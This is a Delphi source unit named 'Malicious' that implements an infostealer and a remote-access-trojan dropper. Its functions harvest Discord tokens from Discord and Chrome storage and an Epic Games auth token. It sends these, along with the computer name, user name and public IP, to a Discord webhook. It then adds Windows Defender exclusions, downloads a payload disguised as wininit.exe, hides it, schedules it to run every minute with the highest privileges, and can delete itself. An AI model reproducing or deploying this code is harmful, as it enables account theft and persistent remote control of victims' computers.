unit Malicious;

interface

uses
  SysUtils, Windows, Classes, ShellAPI, UrlMon, Functions;

procedure InjectRAT(Link: String; SelfDelete: Boolean);
procedure StealData(WebhookURL: String);

implementation

//GetDiscordToken
function GetDiscordToken(Path: String): String;
var
  srSearch: TSearchRec;
  Buffer: String;
  Position: Integer;
begin
  Result := '';
  if FindFirst(Path + '*.ldb', faAnyFile, srSearch) = 0 then begin
    repeat
      Buffer := ReadFileToString(Path + srSearch.Name);
      Position := Pos('>oken', Buffer);

      if Position > 0 then begin
        while Buffer[Position] <> '"' do Inc(Position);
        Result := Result + Copy(Buffer, Position+1, 59) + '\n';
      end;
    until FindNext(srSearch) <> 0;
    SysUtils.FindClose(srSearch);
  end;
end;
//GetDiscordToken


//GetEpicGamesToken
function GetEpicGamesToken: String;
var
  Buffer: String;
  Position, Count: Integer;
begin
  Result := '';
  Buffer := ReadFileToString(GetEnvironmentVariable('LocalAppData') + '\EpicGamesLauncher\Saved\Config\Windows\GameUserSettings.ini');
  Position := Pos('Data=', Buffer);
  Count := 0;

  if Position > 0 then begin
    while Ord(Buffer[Position+Count]) <> 10 do Inc(Count);
    Result := Copy(Buffer, Position+5, Count-6) + '\n';
  end;
end;
//GetEpicGamesToken


//StealData
procedure StealData(WebhookURL: String);
var
  MessageContent: String;
  DiscordToken: String;
  EpicGames: String;
begin
  DiscordToken := GetDiscordToken(GetEnvironmentVariable('AppData') + '\discord\Local Storage\leveldb\');
  DiscordToken := DiscordToken + GetDiscordToken(GetEnvironmentVariable('LocalAppData') + '\Google\Chrome\User Data\Default\Local Storage\leveldb\');
  EpicGames := GetEpicGamesToken;
  if DiscordToken = '' then DiscordToken := 'Did not found tokens!\n';
  if EpicGames = '' then EpicGames := 'Did not found token!\n';

  MessageContent := '```\n' +
                    GetEnvironmentVariable('COMPUTERNAME') + '_' + GetEnvironmentVariable('USERNAME') +
                    '\n\nIP Address:\n' + GetPublicIP +
                    '\n\nDiscord Tokens:\n' + DiscordToken +
                    '\nEpic Games Token:\n' + EpicGames +
                    '```';

  SendDiscordWebhook(WebhookURL, MessageContent);
end;
//StealData


//InjectRAT
procedure InjectRAT(Link: String; SelfDelete: Boolean);
begin
  if not IsAdmin then Exit;
  ExecuteWait('powershell.exe', '-Command Add-MpPreference -ExclusionProcess "wininit.exe"', SW_HIDE);
  ExecuteWait('powershell.exe', '-Command Add-MpPreference -ExclusionPath "C:\Windows"', SW_HIDE);

  URLDownloadToFile(nil, PChar(Link), 'C:\Windows\wininit.exe', 0, nil);

  ExecuteWait('attrib.exe', '+h +s "C:\Windows\wininit.exe"', SW_HIDE);
  ExecuteWait('SchTasks.exe', '/Create /TN "Windows Start-Up Application" /SC MINUTE /TR "C:\Windows\wininit.exe" /RL HIGHEST /F', SW_HIDE);
  ExecuteWait('SchTasks.exe', '/Run /TN "Windows Start-Up Application"', SW_HIDE);
  if SelfDelete then Functions.SelfDelete;
end;
//InjectRAT

end.
 